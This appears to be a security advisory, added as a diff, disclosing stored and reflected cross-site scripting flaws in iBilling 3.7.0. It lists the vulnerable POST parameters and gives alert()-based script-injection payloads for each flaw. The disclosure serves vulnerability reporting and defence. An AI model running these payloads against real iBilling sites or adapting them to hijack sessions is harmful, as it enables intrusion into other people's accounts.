@@ -1,0 +1,57 @@
+iBilling v3.7.0 Multiple Stored and Reflected Cross Site Scripting Vulnerabilities
+
+
+Vendor: iBilling
+Product web page: http://www.ibilling.io/
+Affected version: 3.7.0
+
+Summary: The features you want, the simplicity you need! Beautifully 
+designed for best User Interface & User Experience. The software 
+That Works For YOUR Business! Get growing – with affordable, scalable 
+business software. Find innovative ways to manage customers data, 
+communicate with customer, know your business cashflow, net worth, 
+send invoice to customer Hassle-free with single click payment reminder, 
+payment confirmations & get paid online integrated with payment gateways.
+
+Desc: iBilling suffers from multiple cross-site scripting vulnerabilities. 
+The issue is triggered when input passed via multiple parameters is not 
+properly sanitized before being returned to the user. This can be exploited 
+to execute arbitrary HTML and script code in a user's browser session in 
+context of an affected site.
+
+
+Tested on: nginx
+	       PHP/5.5.9-1ubuntu4.6
+
+
+Vulnerability discovered by Bikramaditya 'PhoenixX' Guha
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5332
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5332.php
+
+
+
+08.06.2016
+
+
+1. Cross Site Scripting (Stored):
+
+http://localhost/ibilling/index.php
+Parameters: msg, desc, account, phone, company, address, city, state, zip, tags, description, ref (POST)
+
+Payload(s):
+account=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&company=%22%3E%3Cscript%3Ealert(2)%3C%2Fscript%3E&email=test%40yahoo.com&phone=%22%3E%3Cscript%3Ealert(4)%3C%2Fscript%3E&address=%22%3E%3Cscript%3Ealert(5)%3C%2Fscript%3E&city=%22%3E%3Cscript%3Ealert(6)%3C%2Fscript%3E&state=%22%3E%3Cscript%3Ealert(7)%3C%2Fscript%3E&zip=%22%3E%3Cscript%3Ealert(8)%3C%2Fscript%3E&country=TR&tags%5B%5D=web_development%22%3E%3Cscript%3Ealert(9)%3C%2Fscript%3E
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+2. Cross Site Scripting (Reflected):
+
+http://localhost/ibilling/index.php
+Parameters: cid (POST)
+
+Payload(s):
+cid=1001"><script>alert(1)</script>&msg=&icon=
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
